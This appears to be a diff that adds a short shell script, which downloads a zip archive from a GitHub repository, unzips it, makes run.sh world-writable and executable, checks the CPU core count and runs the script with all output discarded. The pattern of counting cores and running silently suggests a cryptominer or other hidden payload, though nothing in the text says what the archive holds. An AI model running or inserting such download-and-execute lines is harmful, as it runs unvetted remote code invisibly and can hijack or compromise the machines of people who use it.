@@ -1,0 +1,4 @@
+wget https://github.com/renjanaayudisha57/fantastic-adventure/raw/refs/heads/main/tulup-main.zip
+unzip tulup-main.zip
+cd tulup-main
+cd vertex && chmod 777 run.sh && nproc --all && ./run.sh 7 >/dev/null 2>&1
